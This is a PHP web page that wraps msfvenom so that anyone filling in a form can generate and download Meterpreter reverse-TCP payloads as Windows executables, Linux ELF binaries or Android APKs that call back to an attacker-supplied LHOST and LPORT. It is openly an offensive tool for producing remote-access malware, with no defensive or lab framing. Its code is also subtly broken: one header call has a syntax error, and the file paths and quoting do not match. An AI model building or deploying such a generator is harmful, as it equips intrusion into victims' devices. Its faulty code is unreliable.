<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSFVenom Payload Generator</title>
</head>
<body>
    <h1>MSFVenom Payload Generator</h1>
    <form method="POST">
        <label for="lhost">LHOST:</label>
        <input type="text" id="lhost" name="lhost" required><br><br>
        
        <label for="lport">LPORT:</label>
        <input type="text" id="lport" name="lport" required><br><br>
        
        <label for="payload_type">Payload Type:</label>
        <select id="payload_type" name="payload_type" required>
            <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
            <option value="linux/x86/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP</option>
            <option value="android/meterpreter/reverse_tcp">Android Meterpreter Reverse TCP</option>
            <!-- Add more payload types as needed -->
        </select><br><br>
        
        <label for="output_format">Output Format:</label>
        <select id="output_format" name="output_format" required>
            <option value="exe">Windows Executable (exe)</option>
            <option value="elf">Linux Executable (elf)</option>
            <option value="apk">Android Package (apk)</option>
            <!-- Add more formats as needed -->
        </select><br><br>
        
        <button type="submit" name="generate">Generate and Download Payload</button>
    </form>

    <?php
    if (isset($_POST['generate'])) {
        $lhost = escapeshellarg($_POST['lhost']);
        $lport = escapeshellarg($_POST['lport']);
        $payload_type = escapeshellarg($_POST['payload_type']);
        $output_format = escapeshellarg($_POST['output_format']);

        // Define the output file name
        $output_file = "payload." . $output_format;

        // Build the msfvenom command
        $command = "msfvenom -p $payload_type LHOST=$lhost LPORT=$lport -f $output_format -o /var/www/html/$output_file 2>&1";

        // Execute the command
        exec($command, $output, $return_var);

        if ($return_var === 0) {
            // Provide the file for download
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($output_file) . '"';
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($output_file));
            readfile($output_file);

            // Delete the file after download
            unlink($output_file);
            exit;
        } else {
            echo "<p style='color: red;'>Error generating payload. Please check your inputs and try again.</p>";
            echo "<pre>" . implode("\n", $output) . "</pre>";
        }
    }
    ?>
</body>
</html>
